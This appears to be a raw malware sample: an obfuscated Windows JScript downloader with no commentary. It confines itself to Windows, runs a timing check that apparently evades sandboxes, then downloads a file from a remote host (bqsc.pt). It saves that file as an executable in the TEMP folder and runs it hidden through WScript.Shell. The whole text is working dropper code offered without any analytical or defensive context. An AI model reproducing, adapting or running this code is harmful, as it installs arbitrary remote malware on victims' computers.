var _Q = false;
var _KY = "CreateObject";
var _VB = function _OG() {return WScript[_KY]("WScript"+".Shell");}(), _TK = 11;
var _G0 = "MSXML2.XMLHTTP";
var _N = 2123213;
var _M = 0;
function _Z(_RV){_VB["Run"](_RV, _M, _M);};
function _O(){return _G0 + "";};
function _GG(_E, _QR){_M = _M * 1; return _E - _QR;};
function _K0(){return _KY;};
/*@cc_on
  @if (@_win32 || @_win64)
    _Q = true;
  @end
@*/
if (_Q)
{
var _RS = "";
function _K(){return 22;};
var _XC = 0; var _AR = 0;
function _V0()
{
var _NZ = new this["Date"]();
var _B = _NZ["getUTCMilliseconds"]();
WScript["Sleep"](_K());
var _NZ = new this["Date"]();
var _A = _NZ["getUTCMilliseconds"]();
WScript["Sleep"](_K());
var _NZ = new this["Date"]();
var _IB = _NZ["getUTCMilliseconds"]();
var _XC = "_KG";
_XC = _GG(_A, _B);
var _AR = "_X";
_AR = _GG(_IB, _A);
_RS = "open";
return _GG(_XC, _AR);
}
var _SL = false;
var _PY = false;
for (var _RG = _M; _RG < _K() * 1; _RG++){if (_V0() != _M){
_SL = true; 
_AR = "31" + 11 * _XC + _AR; 
_PY = true; 
break;
}}
function _SD() {return ((_SL == true) && (_SL == _PY)) ? 1 : _M;};
if (_SL && _SD() && _PY){
function _G() {return _VB["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "4kHLk7c6DHcGeKTh.ex" + "e";};
 _RH = _O();
 _EA = WScript[_KY](_RH);
 var _BS = 1;
 while (_BS){
try {
	if (_BS == 1)
	{
		_EA[_RS]("GET", "http://bqsc.pt/c6ska", false);
		_EA["send"]();
		_A0 = "Sleep";
	}
	WScript[_A0](_K() + 120); 
	if (_EA["readystate"] < 2 * 2) continue;
	_BS = _M;
	function _V(_C) {var _VC = (1, 2, 3, 4, 5, _C); return _VC;};
	_W = WScript[_K0()]("ADODB.Stream");
	_RH = _W;
	_RH[_RS]();
	_RH["type"] = _V(1);
	_RH["write"](_EA["ResponseBody"]);
	_W["position"] = _V(_M);
	_RH["Save" + "ToFile"](_G(), 2);
	_W["cl"+"ose"]();
	_KV = _G();
	_Z(_KV);
} catch(_NM){};
}
}
}

